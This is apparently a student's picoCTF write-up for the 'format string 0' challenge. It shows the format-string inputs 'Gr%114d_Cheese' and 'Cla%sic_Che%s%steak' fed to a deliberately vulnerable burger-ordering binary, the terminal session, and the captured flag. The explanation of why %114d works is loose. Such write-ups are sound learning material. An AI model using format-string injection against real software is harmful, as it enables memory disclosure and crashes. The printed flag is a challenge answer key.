# **BINARY EXP**
## **<ins>FORMAT STRING 0</ins>**
### CHALLENGE DESCRIPTION:
Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 52579

After running the command in the webshell I noticed that the command which was under the function serve_patrick() was running.
Hence by looking at the source code, by entering the second option that is Gr%114d_Cheese the control goes to the function serve_bob().
We enter the second option because %114d is a format specifier which stores garbage values and hence the number of bytes increases 
and the condition is satisfied.

Under the function serve_bob() we enter Cla%sic_Che%s%steak because again %s is a format specifier for strings.
And since the flag is a string the flag is printed.


```
manasvini152-picoctf@webshell:~$ nc mimas.picoctf.net 55472
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation:  Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
```

### SOLVE: 
***FLAG:***: picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}

## Concepts learnt:
I learnt about format specifiers in C programmming and about functions and how to read the source code.

## Resources:
None.
